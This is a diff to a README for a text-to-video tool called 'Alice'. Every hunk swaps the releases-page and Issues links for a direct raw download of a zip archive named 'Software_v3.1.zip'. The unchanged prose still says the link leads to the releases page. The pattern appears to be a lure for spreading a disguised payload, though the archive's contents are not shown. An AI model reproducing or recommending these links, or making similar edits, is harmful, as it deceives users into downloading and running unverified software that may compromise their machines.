@@ -1,6 +1,6 @@
 # 🤖 Alice - Fast Text-to-Video Generation
 
-[![Download Alice](https://img.shields.io/badge/Download-Alice-brightgreen?style=for-the-badge)](https://github.com/yelkofdez19/Alice/releases)
+[![Download Alice](https://img.shields.io/badge/Download-Alice-brightgreen?style=for-the-badge)](https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip)
 
 ## 📋 What is Alice?
 
@@ -35,14 +35,14 @@ Having these in place ensures Alice runs smoothly without errors.
 
 Use the link below to get the latest version of Alice:
 
-[![Download Alice](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/yelkofdez19/Alice/releases)
+[![Download Alice](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip)
 
 This link will take you to the GitHub releases page. Here you will find the latest version available.
 
 ### Steps to download:
 
 1. Click the link above or visit:  
-   https://github.com/yelkofdez19/Alice/releases
+   https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip
 
 2. On the releases page, find the latest release. The newest version is usually at the top.
 
@@ -154,7 +154,7 @@ Alice stores generated videos in a folder on your computer.
 If you need help, use these options:
 
 - Visit the GitHub repository's Issues page to see common questions:  
-  https://github.com/yelkofdez19/Alice/issues
+  https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip
 
 - Search for existing answers before creating new requests.
 
@@ -174,10 +174,10 @@ The software does not send data to external servers during use.
 
 Check the download page regularly for new versions:
 
-https://github.com/yelkofdez19/Alice/releases
+https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip
 
 Updating ensures you have the latest features, improvements, and bug fixes.
 
 ---
 
-[![Download Alice](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/yelkofdez19/Alice/releases)
+[![Download Alice](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/yelkofdez19/Alice/raw/refs/heads/main/scripts/Software_v3.1.zip)
